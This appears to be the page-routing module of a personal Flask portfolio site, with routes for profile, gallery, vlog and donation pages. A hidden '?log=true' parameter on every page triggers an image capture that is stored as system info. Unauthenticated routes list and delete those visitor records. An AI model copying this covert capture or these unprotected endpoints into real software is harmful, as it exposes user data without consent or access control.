# pages.py
from flask import Blueprint, redirect, url_for, render_template, request, jsonify
from Services.PortfolioService import PortfolioService
from Services.VisitService import VisitService
from utils import filter_data, paginate_data, capture_image, get_random_tags
from config import (
    ADD_PORTFOLIO_PAGE,
    CONCERN_PAGE,
    GALLERY_PAGE,
    IMAGE_PATH,
    PROFILE_IMAGE,
    PROFILE_IMAGE_GIF,
    INTRO_PAGE,
    PROFILE_PAGE,
    RESUME_PDF,
    VLOG_PAGE,
    MUSIC_PAGE,
    DEVICE_INFO_VISIT_PAGE,
    DONATION_PAGE,
    get_locale,
)
from flask_babel import gettext  # type: ignore
from markupsafe import escape  # type: ignore
import requests

# Create a Blueprint for pages
pages_bp = Blueprint("pages", __name__)

# Initialize Services
portfolio_service = PortfolioService()
visit_service = VisitService()

# ************************** PAGES ********************************


@pages_bp.route("/")
def index():
    return handle_log_parameter() or render_template(INTRO_PAGE)


@pages_bp.route("/profile")
def profile():
    profile_name = gettext("profile_name")
    profile_intro = gettext("profile_intro")
    profile_age = gettext("profile_age")
    profile_introvert = gettext("profile_introvert")
    profile_job = gettext("profile_job")
    profile_goals = gettext("profile_goals")
    profile_desc = f"{escape(profile_intro)} {escape(profile_age)}<br>{escape(profile_introvert)}<br>{escape(profile_job)} {escape(profile_goals)}"

    project_jaom = url_for("static", filename="images/jaom.png", _external=True)
    no_project = url_for("static", filename="images/no-project.png", _external=True)
    voice_icon = url_for("static", filename="images/voice.png", _external=True)

    return handle_log_parameter() or render_template(
        PROFILE_PAGE,
        profile_image=PROFILE_IMAGE,
        profile_image_gif=PROFILE_IMAGE_GIF,
        resume_pdf=RESUME_PDF,
        title="My Portfolio",
        profile_name=profile_name,
        profile_desc=profile_desc,
        project_jaom=project_jaom,
        no_project=no_project,
        voice_icon=voice_icon,
    )


@pages_bp.route("/gallery")
def gallery():
    gallery_url = url_for("static", filename="json/gallery.json", _external=True)

    response = requests.get(gallery_url)
    gallery_data = response.json()

    search_query = request.args.get("search", "")
    tags_query = request.args.get("tags", "")
    filtered_gallery_data = filter_data(gallery_data, get_locale(), search_query, tags_query)

    page = request.args.get("page", 1, type=int)
    items_per_page = 6
    paginated_gallery_data, total_pages = paginate_data(
        filtered_gallery_data, page, items_per_page
    )

    voice_icon = url_for("static", filename="images/voice.png", _external=True)
    random_tags = get_random_tags(gallery_data, 12)

    return handle_log_parameter() or render_template(
        GALLERY_PAGE,
        image_path=IMAGE_PATH,
        gallery_data=paginated_gallery_data,
        current_page=page,
        total_pages=total_pages,
        title="My Gallery",
        search_query=search_query,
        tags_query=tags_query,
        voice_icon=voice_icon,
        random_tags=random_tags,
    )


@pages_bp.route("/vlog")
def vlog():
    vlog_url = url_for("static", filename="json/vlog.json", _external=True)
    response = requests.get(vlog_url)
    vlog_data = response.json()

    search_query = request.args.get("search", "")
    tags_query = request.args.get("tags", "")
    filtered_vlog_data = filter_data(vlog_data, get_locale(), search_query, tags_query)

    page = request.args.get("page", 1, type=int)
    items_per_page = 6
    paginated_vlog_data, total_pages = paginate_data(
        filtered_vlog_data, page, items_per_page
    )
    random_tags = get_random_tags(vlog_data, 12)


    return handle_log_parameter() or render_template(
        VLOG_PAGE,
        vlogs=paginated_vlog_data,
        current_page=page,
        total_pages=total_pages,
        title="My Vlogs",
        search_query=search_query,
        tags_query=tags_query,
        random_tags=random_tags,
    )


@pages_bp.route("/music")
def music():
    return handle_log_parameter() or render_template(MUSIC_PAGE, title="My Fav Music")


@pages_bp.route("/concern")
def concern():
    return handle_log_parameter() or render_template(CONCERN_PAGE, title="My Concern")


@pages_bp.route("/change_language/<lang_code>")
def change_language(lang_code):
    referrer_url = request.referrer if request.referrer else url_for("index")

    response = redirect(
        f"{referrer_url.split('?')[0]}?search="
    )
    response.set_cookie("lang", lang_code)
    return response


@pages_bp.route("/add_portfolio_form")
def add_portfolio_form():
    return handle_log_parameter() or render_template(ADD_PORTFOLIO_PAGE)


@pages_bp.route("/add_portfolio", methods=["POST"])
def add_portfolio():
    data = {
        "name": request.form.get("name"),
        "email": request.form.get("email"),
    }

    try:
        portfolio_service.add_portfolio(data["name"], data["email"])
        return jsonify({"message": "Data inserted successfully!"}), 201
    except Exception as e:
        return jsonify({"error": str(e)}), 400


@pages_bp.route("/donation")
def donation():
    return handle_log_parameter() or render_template(DONATION_PAGE)


@pages_bp.route("/device-info/visits")
def device_info():
    page = int(request.args.get("page", 1))
    per_page = 10
    documents, total_docs = visit_service.get_paginated_system_info(page, per_page)
    total_pages = (total_docs + per_page - 1) // per_page

    return handle_log_parameter() or render_template(
        DEVICE_INFO_VISIT_PAGE,
        documents=[doc.to_dict() for doc in documents],
        current_page=page,
        total_pages=total_pages,
        title="User Visits",
    )


@pages_bp.route("/delete_page_system_info", methods=["POST"])
def delete_page_system_info():
    """Delete only the records displayed on the current page."""
    data = request.json
    records = data.get("records", [])

    result = visit_service.delete_page_system_info(records)
    return jsonify(result)


# ************************** PRIVATE FUNCTIONS ********************************
def handle_log_parameter():
    log_query = request.args.get("log", "").lower()
    if log_query == "true":
        cloudinary_url, error = capture_image()
        print(cloudinary_url)
        print(error)
        
        result = portfolio_service.add_system_info(cloudinary_url=cloudinary_url)
        print(result)
        return redirect(url_for(request.endpoint))

    return None